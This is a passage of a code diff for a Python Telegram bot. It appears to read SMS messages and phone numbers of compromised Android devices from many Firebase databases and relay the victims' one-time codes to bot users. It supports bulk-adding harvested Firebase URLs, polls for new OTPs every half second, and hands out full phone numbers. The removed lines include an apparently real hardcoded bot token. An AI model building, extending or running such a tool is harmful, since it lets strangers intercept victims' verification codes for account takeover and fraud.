@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """
-Firebase SMS Dashboard Bot — FREE Edition + Force Join
+Firebase SMS Dashboard Bot — FREE Edition (No Refer / No Credits / Manual Refresh)
 - Multi-Firebase (40)
-- AUTO REFRESH every 30s
-- BULK Firebase add (extract URLs from any text)
+- BULK Firebase add
 - FULL phone number display
-- ✅ Force Join Channels (Admin controlled)
-- ❌ No Referral, No Captcha, No Credits
-- Admin unlimited access
-- SMS monitor idle timeout (10 min no button tap)
-- ⚡ Flask keep-alive server
+- ✅ Force Join Channels (Admin controlled, default EMPTY)
+- ❌ No Referral, No Credits, No Captcha
+- ❌ No Auto-Refresh (sirf admin manual refresh)
+- ⚡ Fast OTP delivery (0.5s polling)
+- 📉 Render-optimized (bandwidth saving)
+- Flask keep-alive server
 """
 
 import os
@@ -39,8 +39,8 @@ from telegram.ext import (
 # ============================================================
 # CONFIG
 # ============================================================
-BOT_TOKEN = "8858051706:AAHKkENj8tl5a7W9H5vUNbi7wcCKDxuSdCM"
-ADMIN_IDS = [8645142724]
+BOT_TOKEN = "BOT_TOKEN"
+ADMIN_IDS = [8994623958]
 
 logging.basicConfig(
     level=logging.INFO,
@@ -49,21 +49,23 @@ logging.basicConfig(
 logger = logging.getLogger("FirebaseSMSBot")
 
 # ============================================================
-# CONSTANTS
+# CONSTANTS (⚡ Speed + 📉 Bandwidth Optimized)
 # ============================================================
-FB_REQUEST_TIMEOUT = 10
-FB_RETRY_MAX = 1
+FB_REQUEST_TIMEOUT = 6
+FB_RETRY_MAX = 0
 FB_RETRY_BACKOFF = 1.2
 FB_CLIENTS_MAX_BYTES = 50 * 1024 * 1024
 FB_MESSAGES_LIMIT = 5
 MAX_FIREBASES = 40
 CLEANUP_INTERVAL = 60
-SMS_MONITOR_INTERVAL = 1
+
+# ⚡ Fast OTP: 0.5s polling
+SMS_MONITOR_INTERVAL = 0.5
 SMS_MONITOR_DURATION = 300
 SMS_MONITOR_IDLE_TIMEOUT = 600
-ADMIN_PANEL_EDIT_INTERVAL = 5
 
-ADMIN_DEVICE_REFRESH_INTERVAL = 30
+# 📉 Admin panel edit interval
+ADMIN_PANEL_EDIT_INTERVAL = 5
 
 WELCOME_IMAGE_URL = "https://i.ibb.co/cKM4HgWZ/file-000000000b5482089195baf993bd9642.png"
 
@@ -73,11 +75,15 @@ GLOBAL_FB_FILE = os.getenv("GLOBAL_FB_FILE", "global_firebases.json")
 GLOBAL_DEVICE_CACHE_FILE = os.getenv("GLOBAL_DEVICE_CACHE_FILE", "global_devices_cache.json")
 FORCE_JOIN_FILE = os.getenv("FORCE_JOIN_FILE", "force_join_channels.json")
 
-# ⚡ Flask config
 FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
 FLASK_PORT = int(os.getenv("FLASK_PORT", os.getenv("PORT", 8080)))
 
-ACCESS_CHECK_INTERVAL = 30
+ACCESS_CHECK_INTERVAL = 60
+JOIN_CACHE_TTL = 60
+
+# ⚡ Global HTTP session
+GLOBAL_HTTP_SESSION: Optional[aiohttp.ClientSession] = None
+_user_join_cache: Dict[int, Tuple[bool, float]] = {}
 
 FIREBASE_URL_REGEX = re.compile(
     r'https?://[A-Za-z0-9\-_.]+(?:-default-rtdb)?(?:\.firebaseio\.com|\.firebasedatabase\.app)(?:/[^\s\'"<>()\[\]{}]*)?',
@@ -85,7 +91,7 @@ FIREBASE_URL_REGEX = re.compile(
 )
 
 # ============================================================
-# FLASK KEEP-ALIVE APP
+# FLASK KEEP-ALIVE
 # ============================================================
 flask_app = Flask(__name__)
 BOT_START_TIME = time.time()
@@ -97,14 +103,13 @@ def flask_root():
         uptime = int(time.time() - BOT_START_TIME)
         return jsonify({
             "status": "ok",
-            "service": "Firebase SMS Bot (FREE + Force Join)",
-            "version": "FREE v2",
+            "service": "Firebase SMS Bot (FREE)",
+            "version": "FREE v4",
             "uptime_seconds": uptime,
             "bot_username": BOT_USERNAME,
             "firebases": len(global_fb_list),
             "users": len(known_users),
             "force_join_channels": len(REQUIRED_CHANNELS),
-            "active_sessions": len(user_sessions),
             "active_sms_monitors": len(sms_monitor_tasks),
             "maintenance_mode": maintenance_mode,
             "server_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -133,10 +138,6 @@ def flask_stats():
             "online_devices": global_device_cache.get("online_count", 0),
             "offline_devices": global_device_cache.get("offline_count", 0),
             "last_refresh": global_device_cache.get("updated_at", ""),
-            "force_join_channels": [
-                {"id": c.get("id"), "label": c.get("label")}
-                for c in REQUIRED_CHANNELS
-            ],
         }), 200
     except Exception as exc:
         return jsonify({"status": "error", "message": str(exc)}), 500
@@ -144,16 +145,11 @@ def flask_stats():
 
 def _run_flask():
     try:
-        logger.info("🌐 Starting Flask keep-alive server on %s:%s", FLASK_HOST, FLASK_PORT)
-        flask_app.run(
-            host=FLASK_HOST,
-            port=FLASK_PORT,
-            debug=False,
-            use_reloader=False,
-            threaded=True,
-        )
+        logger.info("🌐 Starting Flask on %s:%s", FLASK_HOST, FLASK_PORT)
+        flask_app.run(host=FLASK_HOST, port=FLASK_PORT,
+                      debug=False, use_reloader=False, threaded=True)
     except Exception as exc:
-        logger.error("Flask server crashed: %s", exc)
+        logger.error("Flask crashed: %s", exc)
 
 
 def start_flask_thread():
@@ -163,9 +159,35 @@ def start_flask_thread():
 
 
 # ============================================================
+# GLOBAL HTTP SESSION
+# ============================================================
+async def get_http_session() -> aiohttp.ClientSession:
+    global GLOBAL_HTTP_SESSION
+    if GLOBAL_HTTP_SESSION is None or GLOBAL_HTTP_SESSION.closed:
+        connector = aiohttp.TCPConnector(
+            limit=100, limit_per_host=30,
+            ttl_dns_cache=300, keepalive_timeout=60,
+            enable_cleanup_closed=True,
+        )
+        GLOBAL_HTTP_SESSION = aiohttp.ClientSession(
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=6, connect=2),
+        )
+    return GLOBAL_HTTP_SESSION
+
+
+async def close_http_session():
+    global GLOBAL_HTTP_SESSION
+    if GLOBAL_HTTP_SESSION and not GLOBAL_HTTP_SESSION.closed:
+        await GLOBAL_HTTP_SESSION.close()
+    GLOBAL_HTTP_SESSION = None
+
+
+# ============================================================
 # FILE HELPERS
 # ============================================================
 def _load_required_channels():
+    """Default channels hataye — sirf admin jo add kare wahi rahenge."""
     try:
         with open(FORCE_JOIN_FILE, "r", encoding="utf-8") as fh:
             saved = json.load(fh)
@@ -181,7 +203,7 @@ def _save_required_channels():
         with open(FORCE_JOIN_FILE, "w", encoding="utf-8") as fh:
             json.dump(REQUIRED_CHANNELS, fh, ensure_ascii=False, indent=2)
     except OSError as exc:
-        logger.warning("could not save force-join channels: %s", exc)
+        logger.warning("could not save channels: %s", exc)
 
 
 def _load_user_ids():
@@ -261,14 +283,13 @@ global_fb_list = _load_global_firebases()
 _last_refresh_time: float = time.monotonic()
 
 known_users = _load_user_ids()
-verified_join_users: Set[int] = set()
 
 _PHONE_PATTERNS = [
     re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'),
     re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE),
     re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'),
     re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
-    re.compile(r'(?:\b91)([6-9]\d{9})\b'),
+    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
     re.compile(r'(?:^|\s|:)([6-9]\d{9})(?:\s|$|\.)'),
 ]
 
@@ -439,8 +460,6 @@ def _get_mob_no(info):
     if not raw:
         return ""
     digits = re.sub(r"\D", "", str(raw))
-    if not digits:
-        return ""
     return digits
 
 
@@ -546,15 +565,6 @@ def _otp_short_message(sender: str, body: str) -> str:
     return f"{brand.title()} login code received."
 
 
-def _extract_number(sender: str) -> str:
-    if not sender:
-        return ""
-    digits = re.sub(r'\D', '', sender)
-    if len(digits) >= 10:
-        return digits[-10:]
-    return ""
-
-
 def extract_phone_from_messages(msgs) -> Optional[str]:
     try:
         if not isinstance(msgs, dict):
@@ -609,7 +619,7 @@ async def _fetch_phone_lookup(session, fb_url: str, cid: str):
                                  query='orderBy="$key"&limitToLast=15')
         fetched, status, _ = await fb_get_json(
             session, murl, max_bytes=FB_CLIENTS_MAX_BYTES,
-            timeout=min(FB_REQUEST_TIMEOUT, 4), retries=0)
+            timeout=2, retries=0)
         if status == "SUCCESS" and isinstance(fetched, dict):
             return cid, extract_phone_from_messages(fetched)
     except Exception:
@@ -620,7 +630,7 @@ async def _fetch_phone_lookup(session, fb_url: str, cid: str):
 async def fetch_devices_from_one(fb_url: str, fb_tag: str,
                                  only_online: bool = True,
                                  prefetched=None) -> Dict[str, dict]:
-    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
+    session = await get_http_session()
     result = {}
     try:
         clients, messages_node = prefetched or await _try_fetch_clients(session, fb_url)
@@ -633,7 +643,7 @@ async def fetch_devices_from_one(fb_url: str, fb_tag: str,
             and (not only_online or info.get("status") is True)
             and not _get_mob_no(info)
             and not isinstance(messages_node.get(cid), dict)
-        ][:50]
+        ][:20]
         if lookup_ids:
             lookup_results = await asyncio.gather(*[
                 _fetch_phone_lookup(session, fb_url, cid) for cid in lookup_ids
@@ -682,15 +692,13 @@ async def fetch_devices_from_one(fb_url: str, fb_tag: str,
             except Exception:
                 continue
         return result
-    finally:
-        try:
-            await session.close()
-        except Exception:
-            pass
+    except Exception as exc:
+        logger.warning("fetch_devices_from_one error: %s", exc)
+        return {}
 
 
 async def fetch_counts_from_one(fb_url: str, fb_tag: str, prefetched=None) -> Tuple[int, int]:
-    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
+    session = await get_http_session()
     online = 0
     offline = 0
     try:
@@ -701,19 +709,15 @@ async def fetch_counts_from_one(fb_url: str, fb_tag: str, prefetched=None) -> Tu
             try:
                 if not isinstance(info, dict):
                     continue
-                is_online = info.get("status") is True
-                if is_online:
+                if info.get("status") is True:
                     online += 1
                 else:
                     offline += 1
             except Exception:
                 continue
         return online, offline
-    finally:
-        try:
-            await session.close()
-        except Exception:
-            pass
+    except Exception:
+        return 0, 0
 
 
 async def fetch_counts_all_firebases(fb_list: List[tuple], prefetched=None) -> Tuple[int, int, Dict[str, dict]]:
@@ -784,38 +788,21 @@ async def refresh_global_device_cache():
     return global_device_cache
 
 
-async def _global_device_refresh_loop():
-    global _last_refresh_time
-    while True:
-        try:
-            await refresh_global_device_cache()
-            _last_refresh_time = time.monotonic()
-            await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)
-        except asyncio.CancelledError:
-            raise
-        except Exception as exc:
-            logger.error("global device refresh loop: %s", exc)
-            await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)
-
-
 async def fetch_last_sms(fb_url: str, device_id: str, limit: int = FB_MESSAGES_LIMIT):
-    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
+    session = await get_http_session()
     try:
         url = build_fb_endpoint(fb_url, f"messages/{device_id}",
                                 query=f'orderBy="$key"&limitToLast={limit}')
-        data, status, _ = await fb_get_json(session, url)
+        data, status, _ = await fb_get_json(session, url, timeout=3)
         if status == "SUCCESS" and isinstance(data, (dict, list)):
             return _newest_with_keys(data, limit=limit)
         url = build_fb_endpoint(fb_url, f"messages/{device_id}")
-        data, status, _ = await fb_get_json(session, url)
+        data, status, _ = await fb_get_json(session, url, timeout=3)
         if status != "SUCCESS" or not isinstance(data, (dict, list)):
             return []
         return _newest_with_keys(data, limit=limit)
-    finally:
-        try:
-            await session.close()
-        except Exception:
-            pass
+    except Exception:
+        return []
 
 
 # ============================================================
@@ -830,7 +817,7 @@ BOT_USERNAME: str = "Otp_random_bot"
 
 
 # ============================================================
-# FORCE JOIN HELPERS
+# FORCE JOIN (Admin controlled, cache-based)
 # ============================================================
 def _is_member_status(status: str) -> bool:
     return status in {"member", "administrator", "creator"}
@@ -841,13 +828,21 @@ async def check_force_join(bot, user_id: int) -> bool:
         return True
     if not REQUIRED_CHANNELS:
         return True
+    cached = _user_join_cache.get(user_id)
+    if cached:
+        result, ts = cached
+        if time.time() - ts < JOIN_CACHE_TTL:
+            return result
     for channel in REQUIRED_CHANNELS:
         try:
             member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
             if not _is_member_status(member.status):
+                _user_join_cache[user_id] = (False, time.time())
                 return False
         except Exception:
+            _user_join_cache[user_id] = (False, time.time())
             return False
+    _user_join_cache[user_id] = (True, time.time())
     return True
 
 
@@ -901,45 +896,7 @@ def build_forcejoin_caption(first_name: str = "User") -> str:
 
 
 # ============================================================
-# SEND WELCOME
-# ============================================================
-async def send_welcome_photo(chat_id: int, first_name: str, *,
-                              user_id: int = 0,
-                              show_force_join: bool = False,
-                              reply_markup=None, bot=None):
-    try:
-        if show_force_join:
-            caption = build_forcejoin_caption(first_name)
-        else:
-            caption = build_welcome_caption_joined(first_name, user_id)
-        payload = {
-            "chat_id": chat_id,
-            "photo": WELCOME_IMAGE_URL,
-            "caption": _bold_blockquote(caption),
-            "parse_mode": "HTML",
-        }
-        if reply_markup is not None:
-            if hasattr(reply_markup, "to_dict"):
-                payload["reply_markup"] = reply_markup.to_dict()
-            else:
-                payload["reply_markup"] = reply_markup
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, json=payload,
-                                     timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                data = await resp.json()
-                if data.get("ok"):
-                    return
-                if bot:
-                    await bot.send_message(
-                        chat_id=chat_id, text=_bold_blockquote(caption),
-                        parse_mode="HTML", reply_markup=reply_markup)
-    except Exception as e:
-        logger.error(f"[WELCOME] error: {e}")
-
-
-# ============================================================
-# WELCOME CAPTION
+# WELCOME CAPTION (No refer / No credits)
 # ============================================================
 def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
     safe_name = (first_name or "User").strip()
@@ -953,7 +910,42 @@ def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
 
 
 # ============================================================
-# ACCESS MIDDLEWARE (Force Join + Maintenance)
+# SEND WELCOME
+# ============================================================
+async def send_welcome_photo(chat_id: int, first_name: str, *,
+                              user_id: int = 0,
+                              show_force_join: bool = False,
+                              reply_markup=None, bot=None):
+    if bot is None:
+        bot = bot_instance
+    try:
+        if show_force_join:
+            caption = build_forcejoin_caption(first_name)
+        else:
+            caption = build_welcome_caption_joined(first_name, user_id)
+        if bot:
+            try:
+                await bot.send_photo(
+                    chat_id=chat_id,
+                    photo=WELCOME_IMAGE_URL,
+                    caption=_bold_blockquote(caption),
+                    parse_mode="HTML",
+                    reply_markup=reply_markup,
+                )
+                return
+            except Exception as exc:
+                logger.warning("send_photo failed: %s", exc)
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text=_bold_blockquote(caption),
+                    parse_mode="HTML",
+                    reply_markup=reply_markup)
+    except Exception as e:
+        logger.error(f"[WELCOME] error: {e}")
+
+
+# ============================================================
+# ACCESS MIDDLEWARE (Only maintenance + force join)
 # ============================================================
 async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE,
                           *, edit_target=None):
@@ -979,15 +971,12 @@ async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE,
                 pass
         return False
 
-    # Force Join Check
     if REQUIRED_CHANNELS and uid not in ADMIN_IDS:
         joined = await check_force_join(context.bot, uid)
         if not joined:
-            verified_join_users.discard(uid)
             unjoined = await get_unjoined_channels(context.bot, uid)
             kb = build_force_join_keyboard(unjoined)
             caption = build_forcejoin_caption(user.first_name or "User")
-            # Try editing existing message first
             if edit_target is not None and update.callback_query:
                 try:
                     cq = update.callback_query
@@ -1033,22 +1022,20 @@ async def force_verify_callback(update: Update, context: ContextTypes.DEFAULT_TY
             pass
         return
 
+    _user_join_cache.pop(uid, None)
     joined = await check_force_join(context.bot, uid)
 
     if joined:
-        verified_join_users.add(uid)
         try:
-            await q.answer("✅ Verified! Access Granted")
+            await q.answer("✅ Verified!")
         except Exception:
             pass
-        # Try edit as caption first (photo message)
         try:
             await q.message.delete()
         except Exception:
             pass
         await _send_main_menu(context, q.message.chat_id, first_name, uid)
     else:
-        verified_join_users.discard(uid)
         unjoined = await get_unjoined_channels(context.bot, uid)
         try:
             await q.answer("❌ Pehle saare channels join karo!", show_alert=True)
@@ -1085,7 +1072,7 @@ async def _send_main_menu(context, chat_id: int, first_name: str, uid: int):
             reply_markup=kb,
         )
     except Exception as exc:
-        logger.warning("welcome image failed, text fallback: %s", exc)
+        logger.warning("welcome image failed: %s", exc)
         await context.bot.send_message(
             chat_id=chat_id,
             text=_bold_blockquote(build_welcome_caption_joined(first_name, uid)),
@@ -1097,15 +1084,6 @@ async def _send_main_menu(context, chat_id: int, first_name: str, uid: int):
 # ============================================================
 # STYLING HELPERS
 # ============================================================
-def make_blockquote(text: str) -> str:
-    if not text:
-        return text
-    stripped = text.strip()
-    if stripped.startswith("<blockquote>") or stripped.startswith(">"):
-        return text
-    return f"<blockquote>{text}</blockquote>"
-
-
 def _bold_blockquote(text: str) -> str:
     if str(text).lstrip().startswith("<blockquote>"):
         return str(text)
@@ -1143,22 +1121,16 @@ def _bold_blockquote(text: str) -> str:
     return f"<blockquote>{''.join(pieces)}</blockquote>"
 
 
-def styled_button(text: str, callback_data: str, style: str = None,
-                  icon_custom_emoji_id: str = None):
+def styled_button(text: str, callback_data: str, style: str = None):
     kwargs = {"callback_data": callback_data}
     if style:
         kwargs["api_kwargs"] = {"style": style}
-        if icon_custom_emoji_id:
-            kwargs["api_kwargs"]["icon_custom_emoji_id"] = icon_custom_emoji_id
     try:
         return InlineKeyboardButton(text, **kwargs)
     except TypeError:
         return InlineKeyboardButton(text, callback_data=callback_data)
 
 
-# ============================================================
-# TIME FORMATTER
-# ============================================================
 def _format_time(ts_key) -> str:
     if not ts_key:
         return "Unknown"
@@ -1186,6 +1158,7 @@ def admin_panel_kb():
     return InlineKeyboardMarkup([
         [styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")],
         [styled_button("📋 MANAGE FIREBASES", "admin_manage_fb", "primary")],
+        [styled_button("🔍 CHECK FIREBASE (REFRESH NOW)", "admin_manual_refresh", "success")],
         [styled_button("📊 BOT STATISTICS", "admin_stats", "primary")],
         [styled_button("📢 BROADCAST", "admin_broadcast", "success")],
         [styled_button(f"➕ ADD JOIN CHANNEL ({channel_count})", "admin_add_channel", "success")],
@@ -1233,7 +1206,7 @@ def admin_channels_kb():
 DEVICES_PER_PAGE = 6
 
 
-def device_list_kb(devices: Dict[str, dict], mode: str = "online", page: int = 0):
+def device_list_kb(devices: Dict[str, dict], page: int = 0):
     items = list(devices.items())[:80]
     total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
     page = max(0, min(page, total_pages - 1))
@@ -1258,7 +1231,7 @@ def device_list_kb(devices: Dict[str, dict], mode: str = "online", page: int = 0
     return InlineKeyboardMarkup(rows)
 
 
-def device_actions_kb(device_id: str, mode: str = "online"):
+def device_actions_kb(device_id: str):
     return InlineKeyboardMarkup([
         [styled_button("📩 LAST 5 SMS", f"sms:{device_id}", "primary")],
         [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")],
@@ -1266,7 +1239,7 @@ def device_actions_kb(device_id: str, mode: str = "online"):
     ])
 
 
-def sms_view_kb(device_id: str, mode: str = "online"):
+def sms_view_kb(device_id: str):
     return InlineKeyboardMarkup([
         [styled_button("🔄 REFRESH", f"sms_refresh:{device_id}", "primary")],
         [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")],
@@ -1292,8 +1265,6 @@ def manage_fb_kb(uid: int):
             styled_button("👁 VIEW", f"scan_fb:{i}", "success"),
             styled_button("🗑 DELETE", f"delete_fb:{i}", "danger"),
         ])
-    if len(fb_list) < MAX_FIREBASES:
-        rows.append([styled_button("➕ ADD FIREBASE", "add_fb", "success")])
     return InlineKeyboardMarkup(rows)
 
 
@@ -1307,12 +1278,6 @@ def firebase_connected_kb(uid: int):
 # ============================================================
 # ADMIN PANEL LIVE
 # ============================================================
-def _seconds_until_next_refresh() -> int:
-    elapsed = time.monotonic() - _last_refresh_time
-    remaining = ADMIN_DEVICE_REFRESH_INTERVAL - elapsed
-    return max(0, int(remaining))
-
-
 def _build_admin_fb_text() -> str:
     if not global_fb_list:
         return ("📋 *Manage Firebases*\n\n"
@@ -1327,10 +1292,7 @@ def _build_admin_fb_text() -> str:
         lines.append(f"*{tag}*\n   🟢 {online}  |  🔴 {offline}  |  📊 {online + offline}")
     lines.append(f"\nTotal panels: {len(global_fb_list)}/{MAX_FIREBASES}")
     lines.append(f"Cache: `{global_device_cache.get('updated_at') or 'not loaded'}`")
-    remaining = _seconds_until_next_refresh()
-    mins, secs = divmod(remaining, 60)
-    lines.append(f"\n⏳ Next auto-refresh in: *{mins}:{secs:02d}*")
-    lines.append("🔄 REFRESH se abhi update karo.")
+    lines.append("\n🔍 *CHECK FIREBASE* dabao refresh ke liye.")
     return "\n".join(lines)
 
 
@@ -1384,8 +1346,7 @@ async def _ensure_session(uid: int):
     sess = user_sessions.get(uid)
     if not sess:
         sess = {"fb_list": [], "active_fb_idx": 0, "devices": {},
-                "current_device": "", "mode": "online",
-                "awaiting_fb_add": False, "device_page": 0}
+                "current_device": "", "mode": "online", "device_page": 0}
         user_sessions[uid] = sess
     return sess
 
@@ -1408,11 +1369,11 @@ async def _show_cached_device_list(q, sess):
         f"🔗 Firebase: {len(sess.get('fb_list', []))}\n\n"
         "Tap a device below.",
         parse_mode="Markdown",
-        reply_markup=device_list_kb(devices, mode="online", page=page))
+        reply_markup=device_list_kb(devices, page=page))
 
 
 # ============================================================
-# DEVICE VIEW BUILDER
+# DEVICE VIEW
 # ============================================================
 def _build_device_view(device_id: str, info: dict):
     tag = info.get("fb_tag", "?")
@@ -1433,8 +1394,7 @@ def _build_device_view(device_id: str, info: dict):
             f"📶 Network: {network}\n"
             f"🤖 Android: {android}\n"
             f"🔋 Battery: {battery}")
-    mode = "online" if online else "offline"
-    return text, device_actions_kb(device_id, mode), mode
+    return text, device_actions_kb(device_id)
 
 
 async def _show_device_view(q, sess, device_id: str):
@@ -1444,27 +1404,21 @@ async def _show_device_view(q, sess, device_id: str):
         fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
         if fb_url:
             info = {
-                "fb_url": fb_url,
-                "fb_tag": parsed_tag,
-                "real_cid": parsed_cid,
-                "phone": "",
-                "online": True,
-                "raw": {},
+                "fb_url": fb_url, "fb_tag": parsed_tag, "real_cid": parsed_cid,
+                "phone": "", "online": True, "raw": {},
             }
             sess.setdefault("devices", {})[device_id] = info
         else:
             await _safe_edit_callback_message(
-                q,
-                "❌ *Device not found.*\n\nPlease tap REFRESH.",
+                q, "❌ *Device not found.*\n\nPlease tap REFRESH.",
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")],
                     [InlineKeyboardButton("🔙 BACK", callback_data="menu_back")],
                 ]))
             return False
-    text, markup, mode = _build_device_view(device_id, info)
+    text, markup = _build_device_view(device_id, info)
     sess["current_device"] = device_id
-    sess["mode"] = mode
     await _safe_edit_callback_message(q, text, parse_mode="Markdown",
                                        reply_markup=markup)
     return True
@@ -1490,9 +1444,6 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sess["devices"] = {}
     sess["current_device"] = ""
     sess["mode"] = "online"
-    sess["awaiting_fb_add"] = False
-    context.user_data.pop("awaiting_url", None)
-    context.user_data.pop("awaiting_fb_add", None)
 
     await _send_main_menu(context, update.effective_chat.id, first_name, uid)
 
@@ -1545,20 +1496,30 @@ async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT
         await _safe_edit_callback_message(
             q,
             "⚠️ *No numbers available right now.*\n\n"
-            "Admin ne abhi koi Firebase add nahi kiya.\n"
-            "Thodi der baad try karo.",
+            "Admin ne abhi koi Firebase add nahi kiya.",
             parse_mode="Markdown", reply_markup=connect_inline_kb())
         return
 
-    await _safe_edit_callback_message(q, "⚡ Generating from ready devices...")
     devices = dict(global_device_cache.get("devices") or {})
     sess["fb_list"] = list(global_fb_list)
+
+    # ⚡ Agar cache empty hai → ek baar fresh scan karo
+    if not devices and global_fb_list:
+        await _safe_edit_callback_message(
+            q,
+            "🔄 *Fresh scan ho raha hai...*\n\n⏳ 5-10 seconds wait karo...",
+            parse_mode="Markdown", reply_markup=connect_inline_kb())
+        try:
+            await refresh_global_device_cache()
+            devices = dict(global_device_cache.get("devices") or {})
+        except Exception as exc:
+            logger.warning("auto refresh on generate failed: %s", exc)
 
     if not devices:
         await _safe_edit_callback_message(
             q,
             "⚠️ *Abhi ready online number nahi hai.*\n\n"
-            "Admin device snapshot background me refresh ho raha hai.",
+            "Admin ko bolo REFRESH dabaye.",
             parse_mode="Markdown", reply_markup=connect_inline_kb())
         return
 
@@ -1579,31 +1540,10 @@ async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT
 
     stop_sms_monitor(uid)
 
-    current_state = sms_monitor_state.get(uid)
-    if current_state:
-        message_ids = current_state.get("sent_message_ids", [])
-        if message_ids:
-            try:
-                for msg_id in message_ids:
-                    await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
-                    await asyncio.sleep(0.1)
-            except Exception as e:
-                logger.warning(f"could not delete old SMS messages: {e}")
-
-    baseline_fingerprints = set()
-    try:
-        baseline_pairs = await fetch_last_sms(info.get("fb_url", ""), real_cid, limit=50)
-        baseline_fingerprints = {
-            _msg_fingerprint(key, message) for key, message in baseline_pairs
-        }
-        logger.info("[SMS MONITOR] baseline uid=%s device=%s count=%d",
-                    uid, device_id, len(baseline_fingerprints))
-    except Exception as exc:
-        logger.warning("SMS baseline unavailable: %s", exc)
-
+    # ⚡ Instant start with empty baseline — first-cycle suppress will skip old SMS
     start_sms_monitor(
         context.bot, uid, chat_id, device_id, unlimited=True,
-        baseline_fingerprints=baseline_fingerprints,
+        baseline_fingerprints=set(),
         fb_url=info.get("fb_url", ""))
 
     text_msg = (
@@ -1616,11 +1556,10 @@ async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT
         f"🤖 Android: {android}\n"
         f"🔋 Battery: {battery}\n\n"
         f"✅ *OTP Monitor ON*\n"
-        f"Naya OTP is chat me aayega.\n"
-        f"Dubara GENERATE pe purana monitor band + messages delete.")
+        f"Naya OTP turant is chat me aayega.")
     await _safe_edit_callback_message(
         q, text_msg, parse_mode="Markdown",
-        reply_markup=device_actions_kb(device_id, "online"))
+        reply_markup=device_actions_kb(device_id))
 
 
 # ============================================================
@@ -1656,9 +1595,7 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 urls = [single]
         if not urls:
             await update.message.reply_text(
-                "❌ Koi valid Firebase URL nahi mila.\n\n"
-                "Text me ek ya multiple Firebase URL paste karo — "
-                "aas-paas ka text auto ignore ho jayega.",
+                "❌ Koi valid Firebase URL nahi mila.",
                 reply_markup=admin_back_kb())
             return
 
@@ -1695,27 +1632,21 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⏳ Detected `{len(urls)}` URL(s) — validating `{len(to_add)}`...",
             parse_mode="Markdown")
 
-        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
+        session = await get_http_session()
         added = []
         dead = []
-        try:
-            for url in to_add:
-                try:
-                    clients, _ = await _try_fetch_clients(session, url)
-                    if clients:
-                        new_tag = f"FB{len(global_fb_list) + 1}"
-                        global_fb_list.append((url, new_tag))
-                        added.append((url, new_tag))
-                    else:
-                        dead.append(url)
-                except Exception as exc:
-                    logger.warning("bulk fb validate failed %s: %s", url, exc)
-                    dead.append(url)
-        finally:
+        for url in to_add:
             try:
-                await session.close()
-            except Exception:
-                pass
+                clients, _ = await _try_fetch_clients(session, url)
+                if clients:
+                    new_tag = f"FB{len(global_fb_list) + 1}"
+                    global_fb_list.append((url, new_tag))
+                    added.append((url, new_tag))
+                else:
+                    dead.append(url)
+            except Exception as exc:
+                logger.warning("bulk fb validate failed %s: %s", url, exc)
+                dead.append(url)
 
         context.user_data.pop("admin_action", None)
 
@@ -1777,21 +1708,17 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if action == "add_channel":
         username = text
-        # Handle URL forms
         if username.startswith("https://t.me/"):
             username = "@" + username.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
         elif not username.startswith("@") and not username.startswith("-"):
             username = "@" + username
 
-        # Validate format: @username OR -100xxxxx (private channel ID)
         if not (re.fullmatch(r"@[A-Za-z0-9_]{5,32}", username)
                 or re.fullmatch(r"-100\d{6,}", username)):
             await update.message.reply_text(
                 "❌ Valid channel username bhejein.\n\n"
-                "Examples:\n"
-                "• `@mychannel`\n"
-                "• `https://t.me/mychannel`\n"
-                "• `-1001234567890` (private channel ID)",
+                "Examples:\n• `@mychannel`\n• `https://t.me/mychannel`\n"
+                "• `-1001234567890` (private)",
                 parse_mode="Markdown", reply_markup=admin_back_kb())
             return
 
@@ -1801,7 +1728,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.pop("admin_action", None)
             return
 
-        # Verify bot can access channel
         try:
             chat = await context.bot.get_chat(username)
             title = chat.title or username
@@ -1809,12 +1735,10 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             logger.warning("admin channel validation failed: %s", exc)
             await update.message.reply_text(
                 "❌ Channel nahi mila ya bot ko access nahi hai.\n\n"
